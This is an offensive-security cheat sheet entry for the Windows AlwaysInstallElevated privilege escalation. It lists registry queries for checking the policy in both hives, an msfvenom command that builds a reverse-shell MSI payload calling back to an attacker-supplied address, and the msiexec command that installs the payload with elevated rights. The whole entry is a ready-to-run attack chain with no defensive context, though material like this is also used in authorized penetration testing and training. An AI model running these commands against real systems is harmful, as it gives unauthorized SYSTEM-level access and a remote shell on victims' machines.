---
title: AlwaysInstallElevated
category: privesc
subcategory: windows-misc
os: windows
command: reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
tools: reg, msiexec, msfvenom
---


### Check both hives

```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

Both should return `0x1`.

### Generate a malicious MSI

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f msi -o evil.msi
```

### Install elevated

```cmd
msiexec /i C:\path\to\evil.msi
```
